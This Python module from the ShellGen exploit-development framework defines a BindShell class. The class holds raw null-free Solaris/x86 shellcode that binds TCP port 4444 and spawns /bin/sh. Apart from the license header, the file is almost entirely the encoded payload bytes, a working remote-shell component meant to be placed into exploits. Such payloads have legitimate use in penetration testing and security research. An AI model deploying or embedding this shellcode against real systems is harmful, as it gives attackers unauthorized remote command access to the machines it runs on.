#!/usr/bin/env python

###############################################################################
## Bind to TCP port 4444 and execute /bin/sh in Solaris/x86                  ##
## Shellcode for ShellGen                                                    ##
## Based on original code by pancake from 48bits                             ##
## http://radare.org/y/                                                      ##
###############################################################################

# Copyright (c) 2012-2015 Mario Vilas, pancake
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Bind to TCP port 4444 and execute /bin/sh."

__all__ = ["BindShell"]

from shellgen import Static

class BindShell (Static):
    """
    "Bind to TCP port 4444 and execute /bin/sh in Solaris/x86.

    Based on original code by pancake from 48bits:
    U{http://radare.org/y/}
    """

    qualities = "payload"
    encoding  = "nullfree"

    port = 4444

    bytes = (
        "\x31\xc9\x83\xe9\xe8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x3f"
        "\x08\x0b\x8d\x83\xeb\xfc\xe2\xf4\x87\xf7\xf3\x72\x03\xff\xdb\xdd"
        "\x0e\xc8\xbb\x17\x6f\x81\xee\xbc\xf6\x59\x4a\xcc\x6e\x59\xbb\x6b"
        "\xc0\xdd\x3a\x5f\xb6\xcf\x59\xeb\x57\x19\x57\xeb\x6e\x81\xed\xe7"
        "\x2f\x5e\x5c\x3d\xd7\xf7\xde\x3d\xd6\xf7\xde\xdd\x6f\x5f\xbb\x67"
        "\xc0\xdd\x3a\x5f\x8d\x01\x5a\xdf\x6f\xb8\x35\x72\xea\x41\x72\x7f"
        "\x6f\x60\x24\xa2\x4c\x60\x63\xa2\x5d\x61\x65\x04\xdc\x58\x58\x04"
        "\xdd\x58\x59\xde\x8f\x33\xf4\x58"
    )
